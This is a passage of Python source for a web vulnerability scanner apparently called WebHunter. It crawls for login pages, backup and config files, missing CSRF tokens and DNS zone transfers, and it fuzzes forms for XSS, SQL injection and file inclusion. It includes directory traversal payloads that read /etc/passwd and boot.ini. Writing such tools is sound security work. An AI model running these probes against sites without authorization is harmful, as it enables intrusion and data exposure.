        self.console.print(f"[bold cyan][+][/bold cyan] Analyzing sitemap.xml for {self.target_url}")
        sitemap_urls = [
            urljoin(self.target_url, '/sitemap.xml'),
            urljoin(self.target_url, '/sitemap_index.xml'),
            urljoin(self.target_url, '/sitemap1.xml')
        ]

        found_sitemaps = []
        for sitemap_url in sitemap_urls:
            response = self._request('GET', sitemap_url)
            if response and response.status_code == 200:
                try:
                    # تحليل محتوى XML
                    root = ET.fromstring(response.text)
                    urls = []

                    # للخريطة القياسية
                    if root.tag.endswith('urlset'):
                        for url in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}url'):
                            loc = url.find('{http://www.sitemaps.org/schemas/sitemap/0.9}loc')
                            if loc is not None:
                                urls.append(loc.text)

                    # لفهرس الخرائط
                    elif root.tag.endswith('sitemapindex'):
                        for sitemap in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}sitemap'):
                            loc = sitemap.find('{http://www.sitemaps.org/schemas/sitemap/0.9}loc')
                            if loc is not None:
                                # تحليل الخرائط الفرعية
                                sub_response = self._request('GET', loc.text)
                                if sub_response and sub_response.status_code == 200:
                                    try:
                                        sub_root = ET.fromstring(sub_response.text)
                                        for url in sub_root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}url'):
                                            sub_loc = url.find('{http://www.sitemaps.org/schemas/sitemap/0.9}loc')
                                            if sub_loc is not None:
                                                urls.append(sub_loc.text)
                                    except ET.ParseError:
                                        pass

                    found_sitemaps.append({
                        'url': sitemap_url,
                        'urls_count': len(urls),
                        'urls': urls[:100]  # حفظ أول 100 رابط فقط
                    })

                except ET.ParseError:
                    found_sitemaps.append({
                        'url': sitemap_url,
                        'error': 'Invalid XML format'
                    })

        if found_sitemaps:
            self.results['sitemap_xml'] = found_sitemaps
            total_urls = sum(sitemap.get('urls_count', 0) for sitemap in found_sitemaps)
            self.console.print(f"[green][+][/green] sitemap.xml analysis complete. Found {len(found_sitemaps)} sitemaps with {total_urls} total URLs.")
        else:
            self.results['sitemap_xml'] = {'error': 'No sitemaps found'}
            self.console.print(f"[yellow][-][/yellow] No sitemaps found.")

    def find_login_pages(self):
        """البحث عن صفحات تسجيل الدخول"""
        self.console.print(f"[bold cyan][+][/bold cyan] Searching for login pages")

        login_paths = [
            '/login', '/admin', '/administrator', '/admin/login', '/wp-admin',
            '/wp-login.php', '/signin', '/auth', '/auth/login', '/user/login',
            '/accounts/login', '/panel', '/cpanel', '/controlpanel', '/admin.php',
            '/login.php', '/signin.php', '/auth.php', '/user.php', '/secure',
            '/secure/login', '/members', '/member', '/users', '/user', '/account',
            '/accounts', '/profile', '/myaccount', '/signin.aspx', '/login.aspx'
        ]

        found_logins = []

        for path in login_paths:
            login_url = urljoin(self.target_url, path)
            response = self._request('GET', login_url)

            if response and response.status_code == 200:
                content = response.text.lower()
                # البحث عن مؤشرات صفحة تسجيل الدخول
                if any(keyword in content for keyword in ['password', 'username', 'login', 'signin', 'auth']):
                    soup = BeautifulSoup(response.text, 'html.parser')
                    forms = soup.find_all('form')
                    if forms:
                        # تحليل النماذج للعثور على حقول كلمة المرور
                        for form in forms:
                            password_fields = form.find_all('input', {'type': 'password'})
                            if password_fields:
                                found_logins.append({
                                    'url': login_url,
                                    'form_action': form.get('action', ''),
                                    'method': form.get('method', 'get'),
                                    'password_field_count': len(password_fields)
                                })
                                break

        self.results['login_pages'] = found_logins
        self.console.print(f"[green][+][/green] Login page search complete. Found {len(found_logins)} potential login pages.")

    def scan_csrf_tokens(self):
        """فحص وجود حماية CSRF"""
        self.console.print(f"[bold cyan][+][/bold cyan] Checking for CSRF protection")

        vulnerable_forms = []

        for form_data in self.results['crawl_data']['forms']:
            url = form_data['url']
            method = form_data['method']
            inputs = [inp[0] for inp in form_data['inputs'] if inp[0]]

            if not inputs:
                continue

            # تحقق من وجود نموذج في الصفحة
            response = self._request('GET', url)
            if not response:
                continue

            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                form_action = form.get('action', '')
                if urljoin(url, form_action) != url:
                    continue

                # البحث عن رموز CSRF المحتملة
                csrf_found = False
                csrf_inputs = form.find_all('input', {'type': 'hidden'})

                for csrf_input in csrf_inputs:
                    name = csrf_input.get('name', '').lower()
                    value = csrf_input.get('value', '')

                    # أسماء شائعة لرموز CSRF
                    if any(token in name for token in ['csrf', 'token', '_token', 'authenticity', 'nonce']):
                        csrf_found = True
                        break

                if not csrf_found:
                    vulnerable_forms.append({
                        'url': url,
                        'method': method,
                        'form_action': form_action,
                        'reason': 'No CSRF token found'
                    })

        self.results['csrf_tokens'] = {
            'vulnerable_forms': vulnerable_forms,
            'total_forms_checked': len(self.results['crawl_data']['forms']),
            'vulnerable_count': len(vulnerable_forms)
        }

        self.console.print(f"[green][+][/green] CSRF protection check complete. Found {len(vulnerable_forms)} potentially vulnerable forms.")

    def find_sensitive_files(self):
        """البحث عن ملفات حساسة"""
        self.console.print(f"[bold cyan][+][/bold cyan] Checking for sensitive files")

        sensitive_files = []
        backup_extensions = ['.bak', '.backup', '.old', '.orig', '.save', '.tmp', '.temp']
        config_patterns = ['config', 'settings', 'database', 'db', 'env', 'conf']

        # البحث عن ملفات النسخ الاحتياطي
        for ext in backup_extensions:
            for path in [f'backup{ext}', f'database{ext}', f'db{ext}', f'config{ext}']:
                file_url = urljoin(self.target_url, path)
                response = self._request('GET', file_url)

                if response and response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'text/html' not in content_type.lower():  # ليست صفحة HTML
                        sensitive_files.append({
                            'url': file_url,
                            'type': 'backup_file',
                            'size': len(response.content),
                            'content_type': content_type
                        })
                        self.results['backup_files'].append(file_url)

        # البحث عن ملفات التكوين
        for pattern in config_patterns:
            for ext in ['.php', '.js', '.json', '.yml', '.yaml', '.ini', '.xml', '.conf']:
                path = f'{pattern}{ext}'
                file_url = urljoin(self.target_url, path)
                response = self._request('GET', file_url)

                if response and response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'text/html' not in content_type.lower():  # ليست صفحة HTML
                        sensitive_files.append({
                            'url': file_url,
                            'type': 'config_file',
                            'size': len(response.content),
                            'content_type': content_type
                        })
                        self.results['config_files'].append(file_url)

        # البحث عن ملفات حساسة أخرى
        for file_path in SIGNATURES['sensitive_files']:
            file_url = urljoin(self.target_url, file_path)
            response = self._request('GET', file_url)

            if response and response.status_code == 200:
                sensitive_files.append({
                    'url': file_url,
                    'type': 'sensitive_file',
                    'size': len(response.content),
                    'content_type': response.headers.get('Content-Type', 'N/A')
                })

                # تحديد مستوى الخطورة
                if any(keyword in file_path.lower() for keyword in ['config', 'dump', 'backup', 'db', 'password']):
                    self.results['vulnerabilities']['medium'].append({
                        'type': 'Sensitive File Exposure',
                        'url': file_url,
                        'evidence': f'Accessible sensitive file: {file_path}'
                    })

        self.results['sensitive_files'] = sensitive_files
        self.console.print(f"[green][+][/green] Sensitive files check complete. Found {len(sensitive_files)} potentially sensitive files.")

    def scan_vulnerabilities(self):
        """فحص الثغرات"""
        self.console.print(f"[bold cyan][+][/bold cyan] Starting vulnerability scan")
        self._scan_xss()
        self._scan_sqli()
        self._scan_lfi()
        self._scan_directory_traversal()
        self._scan_sensitive_files()
        self.console.print(f"[green][+][/green] Vulnerability scan complete.")

    def _scan_xss(self):
        """فحص ثغرات XSS"""
        self.console.print("[yellow][*][/yellow] Testing for Cross-Site Scripting (XSS)")
        payloads = SIGNATURES['xss_payloads']

        for form_data in self.results['crawl_data']['forms']:
            url = form_data['url']
            method = form_data['method']
            inputs = [inp[0] for inp in form_data['inputs'] if inp[0]]

            if not inputs:
                continue

            for payload in payloads:
                data = {inp: payload for inp in inputs}
                try:
                    if method == 'post':
                        response = self._request('POST', url, data=data)
                    else:
                        response = self._request('GET', url, params=data)

                    if response and html.unescape(payload) in response.text:
                        vuln = {
                            'type': 'XSS',
                            'url': url,
                            'method': method,
                            'payload': payload,
                            'evidence': 'Payload reflected in response'
                        }
                        self.results['vulnerabilities']['high'].append(vuln)
                        break
                except Exception:
                    pass

        for url in self.results['crawl_data']['urls']:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                continue

            for param in params:
                original_value = params[param][0]
                for payload in payloads:
                    new_params = params.copy()
                    new_params[param] = [payload]
                    try:
                        from urllib.parse import urlencode
                        response = self._request('GET', parsed._replace(query=urlencode(new_params, doseq=True)).geturl())

                        if response and html.unescape(payload) in response.text:
                            vuln = {
                                'type': 'XSS',
                                'url': url,
                                'method': 'GET',
                                'payload': payload,
                                'evidence': 'Payload reflected in response'
                            }
                            self.results['vulnerabilities']['high'].append(vuln)
                            break
                    except Exception:
                        pass

    def _scan_sqli(self):
        """فحص ثغرات SQL Injection"""
        self.console.print("[yellow][*][/yellow] Testing for SQL Injection (SQLi)")
        errors = [
            "SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", "MySqlClient\\.",
            "PostgreSQL query failed", "Warning.*pg_.*", "valid PostgreSQL result", "Npgsql\\.",
            "Driver.* SQL.*Server", "OLE DB.* SQL Server", "ODBC SQL Server Driver", "SQLServer JDBC Driver",
            "Microsoft OLE DB Provider for ODBC Drivers error", "Oracle error", "Oracle driver",
            "Warning.*oci_.*", "Warning.*ora_.*", "CLI Driver.*DB2", "DB2 SQL error", "SQLSTATE"
        ]

        for form_data in self.results['crawl_data']['forms']:
            url = form_data['url']
            method = form_data['method']
            inputs = [inp[0] for inp in form_data['inputs'] if inp[0]]

            if not inputs:
                continue

            for payload in SIGNATURES['sqli_payloads']:
                data = {inp: payload for inp in inputs}
                try:
                    if method == 'post':
                        response = self._request('POST', url, data=data)
                    else:
                        response = self._request('GET', url, params=data)

                    if response and any(re.search(err, response.text, re.I) for err in errors):
                        vuln = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': method,
                            'payload': payload,
                            'evidence': 'SQL error message in response'
                        }
                        self.results['vulnerabilities']['high'].append(vuln)
                        break
                except Exception:
                    pass

    def _scan_lfi(self):
        """فحص ثغرات Local File Inclusion"""
        self.console.print("[yellow][*][/yellow] Testing for Local File Inclusion (LFI)")

        for form_data in self.results['crawl_data']['forms']:
            url = form_data['url']
            method = form_data['method']
            inputs = [inp[0] for inp in form_data['inputs'] if inp[0]]

            if not inputs:
                continue

            for payload in SIGNATURES['lfi_payloads']:
                data = {inp: payload for inp in inputs}
                try:
                    if method == 'post':
                        response = self._request('POST', url, data=data)
                    else:
                        response = self._request('GET', url, params=data)

                    if response and ('root:x:0:0' in response.text or '[boot loader]' in response.text):
                        vuln = {
                            'type': 'Local File Inclusion',
                            'url': url,
                            'method': method,
                            'payload': payload,
                            'evidence': 'File content (e.g., /etc/passwd) in response'
                        }
                        self.results['vulnerabilities']['high'].append(vuln)
                        break
                except Exception:
                    pass

    def _scan_directory_traversal(self):
        """فحص ثغرات Directory Traversal"""
        self.console.print("[yellow][*][/yellow] Testing for Directory Traversal")

        dt_payloads = [
            "../../../etc/passwd", "..\\..\\..\\..\\..\\..\\..\\boot.ini",
            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd%00"
        ]

        for form_data in self.results['crawl_data']['forms']:
            url = form_data['url']
            method = form_data['method']
            inputs = [inp[0] for inp in form_data['inputs'] if inp[0]]

            if not inputs:
                continue

            for payload in dt_payloads:
                data = {inp: payload for inp in inputs}
                try:
                    if method == 'post':
                        response = self._request('POST', url, data=data)
                    else:
                        response = self._request('GET', url, params=data)

                    if response and ('root:x:0:0' in response.text or '[boot loader]' in response.text):
                        vuln = {
                            'type': 'Directory Traversal',
                            'url': url,
                            'method': method,
                            'payload': payload,
                            'evidence': 'File content (e.g., /etc/passwd) in response'
                        }
                        self.results['vulnerabilities']['high'].append(vuln)
                        break
                except Exception:
                    pass

    def _scan_sensitive_files(self):
        """فحص الملفات الحساسة"""
        self.console.print("[yellow][*][/yellow] Checking for sensitive files")

        for file_path in SIGNATURES['sensitive_files']:
            url = urljoin(self.target_url, file_path)
            response = self._request('GET', url)

            if response and response.status_code == 200:
                self.results['sensitive_files'].append({
                    'url': url,
                    'status_code': response.status_code,
                    'content_type': response.headers.get('Content-Type', 'N/A')
                })

                if 'config' in file_path or 'dump' in file_path or 'backup' in file_path:
                    self.results['vulnerabilities']['medium'].append({
                        'type': 'Sensitive File Exposure',
                        'url': url,
                        'evidence': f'Accessible file: {file_path}'
                    })

    def analyze_seo_performance(self):
        """تحليل SEO وأداء الموقع"""
        self.console.print(f"[bold cyan][+][/bold cyan] Analyzing SEO and performance for {self.target_url}")

        seo_results = {
            'performance': {},
            'seo': {},
            'accessibility': {},
            'best_practices': {}
        }

        # تحليل الأداء الأساسي
        try:
            start_time = time.time()
            response = self._request('GET', self.target_url)
            load_time = time.time() - start_time

            if response:
                seo_results['performance']['load_time'] = f"{load_time:.2f} seconds"
                seo_results['performance']['status_code'] = response.status_code
                seo_results['performance']['size'] = f"{len(response.content) / 1024:.2f} KB"

                # تحليل محتوى الصفحة
                soup = BeautifulSoup(response.text, 'html.parser')

                # تحليل SEO
                title_tag = soup.find('title')
                seo_results['seo']['title'] = title_tag.text.strip() if title_tag else "Missing"
                seo_results['seo']['title_length'] = len(title_tag.text.strip()) if title_tag else 0

                meta_desc = soup.find('meta', attrs={'name': 'description'})
                seo_results['seo']['meta_description'] = meta_desc.get('content', 'Missing') if meta_desc else "Missing"
                seo_results['seo']['meta_description_length'] = len(meta_desc.get('content', '')) if meta_desc else 0

                h1_tags = soup.find_all('h1')
                seo_results['seo']['h1_tags_count'] = len(h1_tags)
                seo_results['seo']['h1_tags'] = [h1.text.strip() for h1 in h1_tags]

                img_tags = soup.find_all('img')
                img_without_alt = [img for img in img_tags if not img.get('alt')]
                seo_results['seo']['images_without_alt'] = len(img_without_alt)
                seo_results['seo']['total_images'] = len(img_tags)

                # تحليل الروابط الداخلية والخارجية
                links = soup.find_all('a', href=True)
                internal_links = []
                external_links = []

                for link in links:
                    href = link['href']
                    full_url = urljoin(self.target_url, href)

                    if urlparse(full_url).netloc == self.target_domain:
                        internal_links.append(full_url)
                    else:
                        external_links.append(full_url)

                seo_results['seo']['internal_links'] = len(internal_links)
                seo_results['seo']['external_links'] = len(external_links)

                # تحليل أفضل الممارسات
                seo_results['best_practices']['has_favicon'] = bool(soup.find('link', rel='icon'))
                seo_results['best_practices']['has_viewport'] = bool(soup.find('meta', attrs={'name': 'viewport'}))
                seo_results['best_practices']['has_robots_meta'] = bool(soup.find('meta', attrs={'name': 'robots'}))

                # تحليل إمكانية الوصول
                seo_results['accessibility']['has_lang_attribute'] = bool(soup.find('html', attrs={'lang': True}))

                # التحقق من استخدام HTTPS
                seo_results['best_practices']['uses_https'] = self.target_url.startswith('https://')

        except Exception as e:
            seo_results['error'] = str(e)

        self.results['seo'] = seo_results
        self.console.print(f"[green][+][/green] SEO and performance analysis complete.")

    def reverse_dns_lookup(self):
        """البحث العكسي في DNS"""
        self.console.print(f"[bold cyan][+][/bold cyan] Performing reverse DNS lookup for {self.results['info']['ip']}")
        try:
            ip = self.results['info']['ip']
            if ip != "N/A":
                hostname = socket.gethostbyaddr(ip)
                self.results['dns_records']['reverse'] = hostname[0]
                self.console.print(f"[green][+][/green] Reverse DNS lookup complete: {hostname[0]}")
            else:
                self.console.print(f"[yellow][-][/yellow] Cannot perform reverse DNS lookup, IP address not found.")
        except socket.herror:
            self.console.print(f"[yellow][-][/yellow] No reverse DNS record found for {ip}")
        except Exception as e:
            self.console.print(f"[red][-][/red] Reverse DNS lookup failed: {str(e)}")

    def dns_zone_transfer(self):
        """محاولة نقل منطقة DNS"""
        self.console.print(f"[bold cyan][+][/bold cyan] Attempting DNS zone transfer for {self.target_domain}")
        try:
            # الحصول على سجلات NS أولاً
            ns_records = []
            try:
                answers = dns.resolver.resolve(self.target_domain, 'NS')
                ns_records = [str(rdata) for rdata in answers]
            except:
                pass

            if not ns_records:
                self.console.print(f"[yellow][-][/yellow] No NS records found for zone transfer attempt.")
                return

            # محاولة نقل المنطقة من كل خادم أسماء
            for ns in ns_records:
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns, self.target_domain))
                    if zone:
                        records = []
                        for name, node in zone.nodes.items():
                            for rdataset in node.rdatasets:
                                for rdata in rdataset:
                                    records.append(f"{name}.{self.target_domain} {rdataset.ttl} {rdataset.rdtype} {rdata}")

                        if records:
                            self.results['dns_records']['zone_transfer'] = {
                                'nameserver': ns,
                                'records': records
                            }
                            self.console.print(f"[green][+][/green] DNS zone transfer successful from {ns}. Found {len(records)} records.")
                            return
                except Exception as e:
                    continue

            self.console.print(f"[yellow][-][/yellow] DNS zone transfer failed on all nameservers.")
        except Exception as e:
            self.console.print(f"[red][-][/red] DNS zone transfer failed: {str(e)}")

    def generate_report(self, format_type='html'):
        """توليد تقرير الفحص"""
        self.console.print(f"[bold cyan][+][/bold cyan] Generating {format_type.upper()} report...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"report_{self.base_domain}_{timestamp}.{format_type}"

        if format_type == 'json':
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=4, default=str)
        elif format_type == 'html':
            self._generate_html_report(filename)
        elif format_type == 'pdf':
            self._generate_pdf_report(filename)

        self.console.print(f"[green][+][/green] Report saved to {filename}")

    def _generate_html_report(self, filename):
        """توليد تقرير HTML"""
        # حساب إجمالي الثغرات حسب الخطورة
        high_vulns = len(self.results['vulnerabilities']['high'])
        medium_vulns = len(self.results['vulnerabilities']['medium'])
        low_vulns = len(self.results['vulnerabilities']['low'])
        total_vulns = high_vulns + medium_vulns + low_vulns

        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>WebHunter Report for {self.target_domain}</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; }}
                .container {{ width: 90%; margin: auto; background: #fff; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); margin-top: 20px; margin-bottom: 20px; border-radius: 5px; }}
                h1, h2, h3 {{ color: #0d6efd; }}
                .header {{ text-align: center; margin-bottom: 30px; padding: 20px; background-color: #f8f9fa; border-radius: 5px; }}
                .summary-card {{ margin-bottom: 20px; }}
                .vulnerability-high {{ color: #dc3545; }}
                .vulnerability-medium {{ color: #fd7e14; }}
                .vulnerability-low {{ color: #198754; }}
                .table {{ margin-bottom: 20px; }}
                .code {{ background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; }}
                .footer {{ text-align: center; margin-top: 30px; color: #6c757d; }}
                .severity-badge {{ padding: 5px 10px; border-radius: 3px; color: white; }}
                .severity-high {{ background-color: #dc3545; }}
                .severity-medium {{ background-color: #fd7e14; }}
                .severity-low {{ background-color: #198754; }}
                .tech-badge {{ background-color: #6f42c1; color: white; padding: 3px 8px; border-radius: 3px; margin: 2px; display: inline-block; }}
                .progress {{ height: 25px; }}
                .nav-tabs {{ margin-bottom: 20px; }}
                .urls-container {{ max-height: 500px; overflow-y: auto; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1><i class="fas fa-shield-alt"></i> WebHunter Security Report</h1>
                    <p class="lead">Comprehensive security analysis for <strong>{self.target_url}</strong></p>
                    <p>Scan Date: {self.results['timestamp']}</p>
                </div>

                <div class="row summary-card">
                    <div class="col-md-3">
                        <div class="card text-center border-danger">
                            <div class="card-body">
                                <h5 class="card-title vulnerability-high">{high_vulns}</h5>
                                <p class="card-text">High Severity</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="card text-center border-warning">
                            <div class="card-body">
                                <h5 class="card-title vulnerability-medium">{medium_vulns}</h5>
                                <p class="card-text">Medium Severity</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="card text-center border-success">
                            <div class="card-body">
                                <h5 class="card-title vulnerability-low">{low_vulns}</h5>
                                <p class="card-text">Low Severity</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="card text-center border-primary">
                            <div class="card-body">
                                <h5 class="card-title">{total_vulns}</h5>
                                <p class="card-text">Total Issues</p>
                            </div>
                        </div>
                    </div>
                </div>

                <ul class="nav nav-tabs" id="reportTabs" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="overview-tab" data-bs-toggle="tab" data-bs-target="#overview" type="button" role="tab">Overview</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="vulnerabilities-tab" data-bs-toggle="tab" data-bs-target="#vulnerabilities" type="button" role="tab">Vulnerabilities</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="tech-tab" data-bs-toggle="tab" data-bs-target="#tech" type="button" role="tab">Technologies</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="network-tab" data-bs-toggle="tab" data-bs-target="#network" type="button" role="tab">Network</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files" type="button" role="tab">Sensitive Files</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="seo-tab" data-bs-toggle="tab" data-bs-target="#seo" type="button" role="tab">SEO & Performance</button>
                    </li>
                </ul>

                <div class="tab-content" id="reportTabsContent">
                    <div class="tab-pane fade show active" id="overview" role="tabpanel">
                        <h2>General Information</h2>
                        <table class="table table-striped">
                            <tr><th>IP Address</th><td>{self.results['info'].get('ip', 'N/A')}</td></tr>
                            <tr><th>HTTP Status</th><td>{self.results['info'].get('http_status', 'N/A')}</td></tr>
                            <tr><th>Title</th><td>{self.results['info'].get('title', 'N/A')}</td></tr>
                            <tr><th>Server</th><td>{self.results['info'].get('server', 'N/A')}</td></tr>
                            <tr><th>Powered By</th><td>{self.results['info'].get('powered_by', 'N/A')}</td></tr>
                        </table>

                        <h2>SSL/TLS Certificate</h2>
                        <div class="code">
                            <pre>{json.dumps(self.results['ssl'], indent=2, default=str)}</pre>
                        </div>

                        <h2>WHOIS Information</h2>
                        <div class="code">
                            <pre>{json.dumps(self.results['whois'], indent=2, default=str)}</pre>
                        </div>
                    </div>

                    <div class="tab-pane fade" id="vulnerabilities" role="tabpanel">
                        <h2>Security Vulnerabilities</h2>

                        <h3 class="vulnerability-high">High Severity</h3>
                        {self._generate_vulnerability_table(self.results['vulnerabilities']['high'])}

                        <h3 class="vulnerability-medium">Medium Severity</h3>
                        {self._generate_vulnerability_table(self.results['vulnerabilities']['medium'])}

                        <h3 class="vulnerability-low">Low Severity</h3>
                        {self._generate_vulnerability_table(self.results['vulnerabilities']['low'])}

                        <h2>CSRF Protection</h2>
                        <p>Total forms checked: {self.results['csrf_tokens'].get('total_forms_checked', 0)}</p>
                        <p>Potentially vulnerable forms: {self.results['csrf_tokens'].get('vulnerable_count', 0)}</p>

                        <h2>Login Pages</h2>
                        <p>Found {len(self.results['login_pages'])} potential login pages:</p>
                        <ul>
                            {"".join(f'<li><a href="{login["url"]}">{login["url"]}</a></li>' for login in self.results['login_pages'])}
                        </ul>
                    </div>

                    <div class="tab-pane fade" id="tech" role="tabpanel">
                        <h2>Detected Technologies</h2>
                        <div>
                            {"".join(f'<span class="tech-badge">{tech}</span>' for tech in self.results['technologies'])}
                        </div>

                        <h2>Crawled Data</h2>
                        <p>URLs Found: {len(self.results['crawl_data']['urls'])}</p>
                        <p>Forms Found: {len(self.results['crawl_data']['forms'])}</p>
                        <p>Emails Found: {len(self.results['crawl_data']['emails'])}</p>
                    </div>

                    <div class="tab-pane fade" id="network" role="tabpanel">
                        <h2>DNS Records</h2>
                        <div class="code">
                            <pre>{json.dumps(self.results['dns_records'], indent=2)}</pre>
                        </div>

                        <h2>Subdomains Found</h2>
                        <ul>
                            {"".join(f'<li>{sub}</li>' for sub in self.results['subdomains'])}
                        </ul>

                        <h2>Open Ports</h2>
                        <table class="table table-striped">
                            {"".join(f'<tr><td>{port}</td><td>{service}</td></tr>' for port, service in self.results['open_ports'].items())}
                        </table>
                    </div>

                    <div class="tab-pane fade" id="files" role="tabpanel">
                        <h2>Sensitive Files Found</h2>
                        <table class="table table-striped">
                            <tr><th>URL</th><th>Type</th><th>Size</th><th>Content-Type</th></tr>
                            {"".join(f'<tr><td><a href="{f["url"]}">{f["url"]}</a></td><td>{f["type"]}</td><td>{f.get("size", "N/A")}</td><td>{f.get("content_type", "N/A")}</td></tr>' for f in self.results['sensitive_files'])}
                        </table>

                        <h2>robots.txt Analysis</h2>
                        {self._generate_robots_analysis()}

                        <h2>sitemap.xml Analysis</h2>
                        {self._generate_sitemap_analysis()}
                    </div>

                    <div class="tab-pane fade" id="seo" role="tabpanel">
                        <h2>SEO & Performance Analysis</h2>
                        {self._generate_seo_analysis()}
                    </div>
                </div>

                <div class="footer">
                    <p>Generated by WebHunter on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                </div>
            </div>

            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
        </body>
        </html>
        """

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

    def _generate_vulnerability_table(self, vulnerabilities):
        """توليد جدول الثغرات"""
        if not vulnerabilities:
            return "<p>No vulnerabilities found in this category.</p>"

        table_html = """
        <table class="table table-striped">
            <tr>
                <th>Type</th>
                <th>URL</th>
                <th>Method</th>
                <th>Payload</th>
                <th>Evidence</th>
            </tr>
        """

        for vuln in vulnerabilities:
            table_html += f"""
            <tr>
                <td>{vuln.get('type', 'N/A')}</td>
                <td><a href="{vuln.get('url', '#')}">{vuln.get('url', 'N/A')}</a></td>
                <td>{vuln.get('method', 'N/A')}</td>
                <td class="code">{vuln.get('payload', 'N/A')}</td>
                <td>{vuln.get('evidence', 'N/A')}</td>
            </tr>
            """

        table_html += "</table>"
        return table_html

    def _generate_robots_analysis(self):
        """توليد تحليل robots.txt"""
        if 'error' in self.results['robots_txt']:
            return f"<p>{self.results['robots_txt']['error']}</p>"

        html = f"""
        <p><strong>URL:</strong> <a href="{self.results['robots_txt']['url']}">{self.results['robots_txt']['url']}</a></p>
        <h4>Disallowed Paths ({len(self.results['robots_txt']['disallowed_paths'])})</h4>
        <ul>
            {"".join(f'<li>{path}</li>' for path in self.results['robots_txt']['disallowed_paths'])}
        </ul>
        <h4>Allowed Paths ({len(self.results['robots_txt']['allowed_paths'])})</h4>
        <ul>
            {"".join(f'<li>{path}</li>' for path in self.results['robots_txt']['allowed_paths'])}
        </ul>
        """

        return html

    def _generate_sitemap_analysis(self):
        """توليد تحليل sitemap.xml"""
        if 'error' in self.results['sitemap_xml']:
            return f"<p>{self.results['sitemap_xml']['error']}</p>"

        html = ""
        for sitemap in self.results['sitemap_xml']:
            if 'error' in sitemap:
                html += f"<p><strong>{sitemap['url']}:</strong> {sitemap['error']}</p>"
            else:
                html += f"""
                <p><strong>URL:</strong> <a href="{sitemap['url']}">{sitemap['url']}</a></p>
                <p><strong>Total URLs:</strong> {sitemap['urls_count']}</p>
                <p><strong>Sample URLs:</strong></p>
                <ul>
                    {"".join(f'<li><a href="{url}">{url}</a></li>' for url in sitemap['urls'])}
                </ul>
                """

        return html

    def _generate_seo_analysis(self):
        """توليد تحليل SEO"""
        if 'error' in self.results['seo']:
            return f"<p>Error during analysis: {self.results['seo']['error']}</p>"

        seo = self.results['seo']

        html = f"""
        <h3>Performance</h3>
        <table class="table table-striped">
            <tr><th>Load Time</th><td>{seo['performance'].get('load_time', 'N/A')}</td></tr>
            <tr><th>Status Code</th><td>{seo['performance'].get('status_code', 'N/A')}</td></tr>
            <tr><th>Page Size</th><td>{seo['performance'].get('size', 'N/A')}</td></tr>
        </table>

        <h3>SEO Elements</h3>
        <table class="table table-striped">
            <tr><th>Title</th><td>{seo['seo'].get('title', 'N/A')}</td></tr>
            <tr><th>Title Length</th><td>{seo['seo'].get('title_length', 0)} characters</td></tr>
            <tr><th>Meta Description</th><td>{seo['seo'].get('meta_description', 'N/A')}</td></tr>
            <tr><th>Meta Description Length</th><td>{seo['seo'].get('meta_description_length', 0)} characters</td></tr>
            <tr><th>H1 Tags Count</th><td>{seo['seo'].get('h1_tags_count', 0)}</td></tr>
            <tr><th>Images Without Alt</th><td>{seo['seo'].get('images_without_alt', 0)} of {seo['seo'].get('total_images', 0)}</td></tr>
            <tr><th>Internal Links</th><td>{seo['seo'].get('internal_links', 0)}</td></tr>
            <tr><th>External Links</th><td>{seo['seo'].get('external_links', 0)}</td></tr>
        </table>

        <h3>Best Practices</h3>
        <table class="table table-striped">
            <tr><th>Uses HTTPS</th><td>{'Yes' if seo['best_practices'].get('uses_https', False) else 'No'}</td></tr>
            <tr><th>Has Favicon</th><td>{'Yes' if seo['best_practices'].get('has_favicon', False) else 'No'}</td></tr>
            <tr><th>Has Viewport Meta</th><td>{'Yes' if seo['best_practices'].get('has_viewport', False) else 'No'}</td></tr>
            <tr><th>Has Robots Meta</th><td>{'Yes' if seo['best_practices'].get('has_robots_meta', False) else 'No'}</td></tr>
        </table>

        <h3>Accessibility</h3>
        <table class="table table-striped">
            <tr><th>Has Lang Attribute</th><td>{'Yes' if seo['accessibility'].get('has_lang_attribute', False) else 'No'}</td></tr>
        </table>
        """

        return html

    def _generate_pdf_report(self, filename):
        """توليد تقرير PDF"""
        try:
            from reportlab.lib.pagesizes import A4
